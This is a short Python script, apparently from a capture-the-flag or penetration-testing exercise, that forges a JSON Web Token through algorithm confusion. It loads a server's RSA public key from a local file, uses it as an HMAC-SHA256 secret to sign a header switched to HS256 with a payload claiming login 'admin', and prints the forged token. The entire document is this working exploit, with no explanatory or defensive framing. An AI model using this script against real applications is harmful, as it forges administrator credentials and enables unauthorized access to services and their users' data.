import hmac
import base64
import hashlib

f=open("......../Desktop/rawdata/public.pem") #public key path
key = f.read()

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0" #add token with typ -> hs256 and with modified payload, without signature  

sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip('=')

print(token+"."+sig)
